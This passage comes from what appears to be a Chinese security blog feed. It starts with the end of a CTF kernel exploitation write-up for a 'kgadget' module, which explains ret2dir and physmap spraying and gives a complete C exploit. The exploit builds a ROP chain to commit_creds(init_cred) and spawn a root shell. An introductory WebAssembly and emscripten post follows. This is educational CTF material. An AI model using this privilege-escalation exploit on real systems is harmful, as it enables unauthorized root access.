/dev/null \</span><br><span class="line">-snapshot \</span><br><span class="line">-append <span class="string">&quot;console=ttyS0 nokaslr pti=on quiet oops=panic panic=1&quot;</span> \</span><br><span class="line">-no-reboot \</span><br><span class="line">-s</span><br></pre></td></tr></table></figure><p>可以发现关闭了kaslr,那么许多利用就十分方便了</p><p>分析一下模块,发现最主要的就是注册了ioctl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">kgadget_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> (__fastcall **v2)(<span class="type">void</span> *, _QWORD); <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v3)(<span class="type">void</span> *, _QWORD); <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> (__fastcall *v4)(<span class="type">void</span> *, _QWORD); <span class="comment">// rsi</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">114514</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = *v2;</span><br><span class="line">    v4 = *v2;</span><br><span class="line">    printk(&amp;unk_370);</span><br><span class="line">    printk(&amp;unk_3A0);</span><br><span class="line">    qmemcpy(</span><br><span class="line">      (<span class="type">void</span> *)(((<span class="type">unsigned</span> __int64)&amp;STACK[<span class="number">0xFE0</span>] &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL) - <span class="number">168</span>),</span><br><span class="line">      <span class="string">&quot;arttnba3arttnba3arttnba3arttnba3arttnba3arttnba3&quot;</span>,</span><br><span class="line">      <span class="number">48</span>);</span><br><span class="line">    *(_QWORD *)(((<span class="type">unsigned</span> __int64)&amp;STACK[<span class="number">0xFE0</span>] &amp; <span class="number">0xFFFFFFFFFFFFF000</span>LL) - <span class="number">112</span>) = <span class="number">0x3361626E74747261</span>LL;</span><br><span class="line">    printk(&amp;unk_3F8);</span><br><span class="line">    v3(&amp;unk_3F8, v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_420);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现其会主动破坏栈底的pt_regs结构体,仅保留r8,r9</p><p>之后调用rdx指向的函数指针</p><p>因此需要找到一段内存，将<code>ROP</code>链填充进去。</p><p>那么这段区域需要选取在哪里，若我们直接再用户空间中构造这段<code>payload</code>，接着将用户空间地址传递给<code>ioctl</code>是不可行的，因为内核开启了<code>smap</code>与<code>smep</code>的保护，因此对用户空间的访问都是不被允许的。</p><p><strong>但其实我们并不需要显式地在内核空间布置数据，而是可以通过一个位于内核空间中的地址直接访问到用户空间中的数据</strong>——那就是映射了整个物理内存的 <code>direct mapping area</code>。</p><p><strong>我们为用户空间所分配的每一张内存页，在内核空间中都能通过这块内存区域访问到</strong>，因此我们只需要在用户空间布置恶意数据，之后再在内核空间的这块区域中找到我们的用户空间数据对应的内核空间地址即可，这便是 <code>ret2dir</code> ——<strong>通过内核空间地址访问到用户空间数据</strong>。</p><p>但是这段内存十分庞大，有64TB的大小，我们怎么才能确保搜索到存放我们<code>payload</code>的地址呢？答案就是尽可能的填充，使得我们用户空间的<code>payload</code>尽可能的大，那么我们搜索到的几率也会增大。</p><p>别看这个内存这么大,但是调试就可以发现真正初始化了的并不算多</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">0xffff888000000000 0xffff888000099000 rw-p    99000      0 [pt_ffff888000000]</span><br><span class="line">0xffff888000099000 0xffff88800009a000 r--p     1000      0 [pt_ffff888000099]</span><br><span class="line">0xffff88800009a000 0xffff88800009b000 r-xp     1000      0 [pt_ffff88800009a]</span><br><span class="line">0xffff88800009b000 0xffff888001000000 rw-p   f65000      0 [pt_ffff88800009b]</span><br><span class="line">0xffff888001000000 0xffff888001e03000 r--p   e03000      0 [pt_ffff888001000]</span><br><span class="line">0xffff888001e03000 0xffff888002000000 rw-p   1fd000      0 [pt_ffff888001e03]</span><br><span class="line">0xffff888002000000 0xffff8880029f7000 r--p   9f7000      0 [pt_ffff888002000]</span><br><span class="line">0xffff8880029f7000 0xffff88800302f000 rw-p   638000      0 [pt_ffff8880029f7]</span><br><span class="line">0xffff88800302f000 0xffff888003030000 r--p     1000      0 [pt_ffff88800302f]</span><br><span class="line">0xffff888003030000 0xffff888003b94000 rw-p   b64000      0 [pt_ffff888003030]</span><br><span class="line">0xffff888003b94000 0xffff888003b95000 r--p     1000      0 [pt_ffff888003b94]</span><br><span class="line">0xffff888003b95000 0xffff8880051a8000 rw-p  1613000      0 [pt_ffff888003b95]</span><br><span class="line">0xffff8880051a8000 0xffff8880051aa000 r--p     2000      0 [pt_ffff8880051a8]</span><br><span class="line">0xffff8880051aa000 0xffff88800ffe0000 rw-p  ae36000      0 [pt_ffff8880051aa]</span><br></pre></td></tr></table></figure><p>而我们通过mmap映射的一般会<strong>出现在具有对应权限的段</strong>例如<code>pt_ffff8880029f7</code>或<code>pt_ffff8880051aa</code>之类的</p><p>我们只要进行大量的页喷射,命中概率就会很大</p><p>因为15000个页就能占据<code>0x3A98000</code>的内存空间,那么在<code>0xffff888000000000+0x7000000</code>这附近命中率就很高了</p><p>如果不放心可以映射更多</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span>  prepare_kernel_cred = <span class="number">0xffffffff810c9540</span>;</span><br><span class="line"><span class="type">size_t</span>  commit_creds = <span class="number">0xffffffff810c92e0</span>;</span><br><span class="line"><span class="type">size_t</span>  init_cred = <span class="number">0xffffffff82a6b700</span>;</span><br><span class="line"><span class="type">size_t</span>  pop_rdi_ret = <span class="number">0xffffffff8108c6f0</span>;</span><br><span class="line"><span class="type">size_t</span>  pop_rax_ret = <span class="number">0xffffffff810115d4</span>;</span><br><span class="line"><span class="type">size_t</span>  pop_rsp_ret = <span class="number">0xffffffff811483d0</span>;</span><br><span class="line"><span class="type">size_t</span>  swapgs_restore_regs_and_return_to_usermode = <span class="number">0xffffffff81c00fb0</span> + <span class="number">27</span>;</span><br><span class="line"><span class="type">size_t</span>  add_rsp_0xe8_pop_rbx_pop_rbp_ret = <span class="number">0xffffffff812bd353</span>;</span><br><span class="line"><span class="type">size_t</span>  add_rsp_0xd8_pop_rbx_pop_rbp_ret = <span class="number">0xffffffff810e7a54</span>;</span><br><span class="line"><span class="type">size_t</span>  add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret = <span class="number">0xffffffff810737fe</span>;</span><br><span class="line"><span class="type">size_t</span>  ret = <span class="number">0xffffffff8108c6f1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>    (*kgadget_ptr)(<span class="type">void</span>);</span><br><span class="line"><span class="type">size_t</span>  *physmap_spray_arr[<span class="number">16000</span>];</span><br><span class="line"><span class="type">size_t</span>  page_size;</span><br><span class="line"><span class="type">size_t</span>     try_hit;</span><br><span class="line"><span class="type">int</span>     dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">errExit</span><span class="params">(<span class="type">char</span> * msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error : \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootShell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Backing from the kernelspace.\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);<span class="comment">// to exit the process normally instead of segmentation fault</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">constructROPChain</span><span class="params">(<span class="type">size_t</span> *rop)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// gadget to trigger pt_regs and for slide</span></span><br><span class="line">    <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x30</span>); idx++)</span><br><span class="line">        rop[idx] = add_rsp_0xa0_pop_rbx_pop_r12_pop_r13_pop_rbp_ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// more normal slide code</span></span><br><span class="line">    <span class="keyword">for</span> (; idx &lt; (page_size / <span class="number">8</span> - <span class="number">0x10</span>); idx++)</span><br><span class="line">        rop[idx] = ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rop chain</span></span><br><span class="line">    rop[idx++] = pop_rdi_ret;</span><br><span class="line">    rop[idx++] = init_cred;</span><br><span class="line">    rop[idx++] = commit_creds;</span><br><span class="line">    rop[idx++] = swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = *(<span class="type">size_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop[idx++] = (<span class="type">size_t</span>) getRootShell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line"></span><br><span class="line">    dev_fd = open(<span class="string">&quot;/dev/kgadget&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;dev fd!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    page_size = sysconf(_SC_PAGESIZE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// construct per-page rop chain</span></span><br><span class="line">    physmap_spray_arr[<span class="number">0</span>] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    constructROPChain(physmap_spray_arr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// spray physmap, so that we can easily hit one of them</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying physmap...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15000</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        physmap_spray_arr[i] = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!physmap_spray_arr[i])</span><br><span class="line">            errExit(<span class="string">&quot;oom for physmap spray!&quot;</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(physmap_spray_arr[i], physmap_spray_arr[<span class="number">0</span>], page_size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger physmap one_gadget...&quot;</span>);</span><br><span class="line">    <span class="comment">//sleep(5);</span></span><br><span class="line"></span><br><span class="line">    try_hit = <span class="number">0xffff888000000000</span> + <span class="number">0x7000000</span>;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,    pop_rsp_ret;&quot;</span>   <span class="comment">// stack migration again</span></span><br><span class="line">        <span class="string">&quot;mov r8,    try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rax,   0x10;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx,   try_hit;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi,   0x1bf52;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi,   dev_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">几道内核堆例题用以巩固</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="kernel" scheme="https://ixout.github.io/tags/kernel/"/>
    
    <category term="heap" scheme="https://ixout.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>WASM初识</title>
    <link href="https://ixout.github.io/posts/1523/"/>
    <id>https://ixout.github.io/posts/1523/</id>
    <published>2023-12-29T11:19:12.000Z</published>
    <updated>2024-01-19T07:04:01.878Z</updated>
    
    <content type="html"><![CDATA[<h1 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h1><p>WASM即WebAssembly</p><p>其是Google开发的一款浏览器中使用的汇编语言.设计的初衷是使用c原生binary加速jiavascript的计算行为。wasm编译形成的binary类似一种<strong><u>基于栈的虚拟机</u></strong>，<strong>有自己的编译器和指令集。</strong></p><p>要谈webassembly的历史就得谈到 <code>javaScript</code> 了，众所周知， <code>javaScript</code> 是一门动态类型的语言，编写程序时无需考虑变量类型，而且还可以运行时改变类型。对于开发者，确实很方便，但对于运行它的引擎就很有问题了。看一下 <code>V8</code> 引擎从 <code>js</code> 源码到执行的一个过程。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/v2-8a34ae8c1a7a0f87e19b1384a025e354_720w.webp" alt="img"></p><p>由于 <code>js</code> 的动态类型，解释器在执行代码的时候会在类型判断上带来一定的性能消耗，降低执行速度。所以 <code>V8</code> 引擎采用了 <code>JIT</code>（即时编译技术） 技术，<u>监控一些经常执行的代码，将其编译成 <code>CPU</code> 直接执行的机器码</u>，提高执行速度。但由于 <code>js</code> 动态类型，在某些情况下还得反优化，回到字节码进行执行。</p><p>随着前端的不断发展，项目的大小和复杂度不断增大，对于某些场景，性能上可能已经无法满足，浏览器厂商们也一直在探索性能优化的方法。</p><h3 id="NaCl-PNaCl"><a href="#NaCl-PNaCl" class="headerlink" title="NaCl/PNaCl"></a>NaCl/PNaCl</h3><p><code>2011</code> 年 <code>Google</code> 在 <code>Chrome</code> 中使用了 <code>NaCl</code> 技术，可以使得 <code>C</code> 语言编写的程序运行到浏览器中，下边是维基百科的定义。</p><blockquote><p><strong>Google Native Client</strong>（缩写为<strong>NaCl</strong>），是一个由谷歌所发起的开放源代码计划，采用BSD许可证。它采用沙盒技术，让Intel x86、ARM或MIPS子集的机器代码直接在沙盒上运行。它能够从浏览器直接运行程序机器代码，独立于用户的操作系统之外，使Web应用程序可以用接近于机器代码运作的速度来运行，同时兼顾安全性。其功能类似于微软的 ActiveX，但是ActiveX只支持视窗系统。</p></blockquote><p>但一个完整的 <code>NaCl</code> 应用，在分发时需要提供支持多个架构平台（X86 / X64 / ARM 等）的模块文件，后来谷歌又推出了与底层架构无关的 <code>PNaCl</code> 技术。但由于其开发难度、兼容性等问题最终没有普及开来。在 <code>2017</code> 年 <code>Google</code> 宣布放弃 <code>PNaCl</code> 转向 <code>WebAssembly</code>。</p><h3 id="ASM-js"><a href="#ASM-js" class="headerlink" title="ASM.js"></a>ASM.js</h3><p><code>ASM.js</code> 是 <code>Mozilla</code> 在 <code>2013</code> 年推出的，是 <code>javaScript</code> 的一个严格子集，可以作为 <code>C/C++</code> 编译的目标语言，从而使得 <code>js</code> 引擎可以采用 <code>AOT(Ahead Of Time)</code> 的编译策略，也就是在运行前直接编译成机器码，因此运行速度会有一定的提升。</p><p><code>ASM.js</code> 通常不直接编写，而是作为一种通过编译器生成的中间语言，该编译器获取 <code>C++</code> 或其他语言的源代码，然后输出 <code>ASM.js</code>。</p><p>例如下边的 <code>C</code> 语言代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过编译器编译会生成下边的 <code>js</code> 代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">i</span>) &#123;</span><br><span class="line">  i = i|<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> (i + <span class="number">1</span>)|<span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里的<code>|0</code> 在 <code>js</code> 中相当于和 <code>0</code> 进行了或操作，所以不影响原本的逻辑。在 <code>asm.js</code> 中起到了类型标记的作用，这样 <code>js</code> 引擎执行的时候就知道 <code>i</code> 是一个整型，返回值是一个整型。除了或操作这种，<code>ASM.js</code> 标准中还规定了很多类似的标记规则，用于告诉 <code>js</code> 引擎变量的类型，便于进行 <code>AOT</code> 优化。</p><p>这看起来和 <code>TypeScript</code> 很像，但其实不是一种东西。<code>TypeScript</code> 是 <code>js</code> 的一个超集，浏览器并不能直接执行 <code>ts</code>，还需要转换为 <code>js</code> 去执行。<code>ts</code> 主要是帮助我们开发人员去看的，增加了代码的可读性，也可以让编辑器提前发现一些错误。而 <code>asm.js</code> 是用于引擎的编译优化。</p><h3 id="WebAssembly"><a href="#WebAssembly" class="headerlink" title="WebAssembly"></a>WebAssembly</h3><p>接下来看一下 <code>WebAssembly</code> 的历史。</p><blockquote><p>2015 年 4 月，WebAssembly Community Group 成立；<br>2015 年 6 月，WebAssembly 第一次以 WCG 的官方名义向外界公布；<br>2016 年 8 月，WebAssembly 开始进入了漫长的 “Browser Preview” 阶段；<br>2017 年 2 月，WebAssembly 官方 LOGO 在 Github 上的众多讨论中被最终确定；同年同月，一个历史性的阶段，四大浏览器（FireFox、Chrome、Edge、WebKit）在 WebAssembly 的 MVP（最小可用版本）标准实现上达成共识，这意味着 WebAssembly 在其 MVP 标准上的 “Brower Preview” 阶段已经结束；<br>2017 年 8 月，W3C WebAssembly Working Group 成立，意味着 WebAssembly 正式成为 W3C 众多技术标准中的一员。</p></blockquote><p><code>WebAssembly</code> 于 <code>2019</code> 年 <code>12</code> 月 <code>5</code> 日成为万维网联盟（<code>W3C</code>）的推荐标准，与 <code>HTML</code>，<code>CSS</code> 和 <code>JavaScript</code> 一起成为 <code>Web</code> 的第四种语言。</p><p>可以看一下目前浏览器的支持程度，已经算比较高了。</p><p><img src="https://pica.zhimg.com/80/v2-62c512d5a8cb3b63c585721c223afeb5_720w.webp?source=1def8aca" alt="img"></p><h1 id="环境搭建及工具"><a href="#环境搭建及工具" class="headerlink" title="环境搭建及工具"></a>环境搭建及工具</h1><h2 id="开发环境emscripten"><a href="#开发环境emscripten" class="headerlink" title="开发环境emscripten"></a>开发环境emscripten</h2><p><a href="https://emscripten.org/">emscripten</a> 是一套编译构建方案，同时提供了比较完整的 SDK ，它在。它使我们可以非常方便地使用 C 语言完成 WebAssembly 相关的开发与环境集成。</p><p>安装的方式，是先拉取 git 代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/emscripten-core/emsdk.git</span><br></pre></td></tr></table></figure><p>进入目录后，执行安装，它会下载 C 编辑器，nodejs 等一堆东西：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd emsdk</span><br><span class="line">./emsdk install latest</span><br><span class="line">./emsdk activate latest</span><br></pre></td></tr></table></figure><p>最后处理一下环境（效果只在终端的当前会话有效）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ./emsdk_env.sh</span><br></pre></td></tr></table></figure><p>当 <code>emcc</code> 是一个可执行命令时，整个环境就准备好了。</p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><p>写一个最简单的hello world程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;hello world.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用命令行编译</p><p><code>emcc hello.c -o hello.html</code></p><p>因为这个编译出来是html,所以用python搭建一个服务器运行验证一下,</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 9000</span><br></pre></td></tr></table></figure><p>之后访问<code>127.0.0.1:9000/hello.html</code>可以看到<code>hello world</code>的消息。以及emsc控制台的界面。</p><h3 id="更多选项"><a href="#更多选项" class="headerlink" title="更多选项"></a>更多选项</h3><p>emcc —help查看</p><h4 id="o"><a href="#o" class="headerlink" title="-o"></a>-o</h4><p>在上一步中我们指定编译结果为html格式</p><p>实际上可以有更多形式</p><p>文档原话是</p><blockquote><p>“-o <target>“<br>   [link] When linking an executable, the “target” file name extension<br>   defines the output type to be generated:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">* &lt;name&gt; **.js** : JavaScript (+ separate **&lt;name&gt;.wasm** file</span><br><span class="line">  if emitting WebAssembly). (default)</span><br><span class="line"></span><br><span class="line">* &lt;name&gt; **.mjs** : ES6 JavaScript module (+ separate</span><br><span class="line">  **&lt;name&gt;.wasm** file if emitting WebAssembly).</span><br><span class="line"></span><br><span class="line">* &lt;name&gt; **.html** : HTML + separate JavaScript file</span><br><span class="line">  (**&lt;name&gt;.js**; + separate **&lt;name&gt;.wasm** file if emitting</span><br><span class="line">  WebAssembly).</span><br><span 